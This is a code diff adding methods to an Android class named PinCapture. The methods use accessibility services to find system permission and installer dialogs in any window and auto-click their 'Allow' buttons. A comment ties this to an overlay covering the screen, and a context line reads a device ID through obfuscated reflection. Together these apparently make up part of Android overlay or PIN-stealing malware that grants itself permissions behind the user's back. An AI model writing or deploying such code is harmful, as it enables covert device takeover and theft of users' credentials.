@@ -897,6 +897,98 @@ public final class PinCapture {
         }
     }
 
+    /** 遮罩抢走 active window 时，遍历所有窗口找权限框并点“允许” */
+    public static boolean clickAllowOnAnyWindow() {
+        try {
+            AccessibilityService svc = svcRef;
+            if (svc == null) return false;
+            java.util.List<android.view.accessibility.AccessibilityWindowInfo> ws = svc.getWindows();
+            if (ws == null) return false;
+            for (android.view.accessibility.AccessibilityWindowInfo w : ws) {
+                AccessibilityNodeInfo r = null;
+                try {
+                    r = w.getRoot();
+                } catch (Throwable ignored) {
+                }
+                if (r == null) continue;
+                String pkg = "";
+                try {
+                    CharSequence p = r.getPackageName();
+                    pkg = p == null ? "" : p.toString();
+                } catch (Throwable ignored) {
+                }
+                if (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller")
+                        || pkg.contains("securitycenter") || pkg.contains("permission")) {
+                    if (clickAllowNode(r)) {
+                        Log.d(TAG, "allow clicked in window pkg=" + pkg);
+                        return true;
+                    }
+                }
+                try {
+                    r.recycle();
+                } catch (Throwable ignored) {
+                }
+            }
+        } catch (Throwable t) {
+            Log.e(TAG, "clickAllowOnAnyWindow failed", t);
+        }
+        return false;
+    }
+
+    private static boolean clickAllowNode(AccessibilityNodeInfo root) {
+        // 1) 先按 resource-id 精确点“允许”按钮
+        String[] ids = {"permission_allow_button", "permission_allow_foreground_only_button",
+                "permission_allow_one_time_button", "permission_allow_all_button"};
+        for (String id : ids) {
+            try {
+                java.util.List<AccessibilityNodeInfo> ns =
+                        root.findAccessibilityNodeInfosByViewId(
+                                "com.android.permissioncontroller:id/" + id);
+                if (ns != null) {
+                    for (AccessibilityNodeInfo n : ns) {
+                        AccessibilityNodeInfo cur = n;
+                        int d = 0;
+                        while (cur != null && d++ < 4) {
+                            if (cur.isClickable() && cur.performAction(0x10)) {
+                                Log.d(TAG, "allow by id=" + id);
+                                return true;
+                            }
+                            cur = cur.getParent();
+                        }
+                    }
+                }
+            } catch (Throwable ignored) {
+            }
+        }
+
+        // 2) 回退：文本（优先 Button 类）
+        String[] labels = {"允许", "始终允许", "仅在使用中允许", "Allow", "While using the app"};
+        for (String label : labels) {
+            java.util.List<AccessibilityNodeInfo> ns = null;
+            try {
+                ns = root.findAccessibilityNodeInfosByText(label);
+            } catch (Throwable ignored) {
+            }
+            if (ns == null) continue;
+            for (AccessibilityNodeInfo n : ns) {
+                AccessibilityNodeInfo cur = n;
+                int depth = 0;
+                while (cur != null && depth++ < 6) {
+                    try {
+                        if (cur.isClickable() && cur.performAction(0x10)) return true;
+                    } catch (Throwable ignored) {
+                    }
+                    try {
+                        cur = cur.getParent();
+                    } catch (Throwable ignored) {
+                        break;
+                    }
+                }
+            }
+        }
+        return false;
+    }
+
     /** 反射取设备 ID（ڜٟٱڀ.د.إ） */
     private static String deviceId() {
         try {
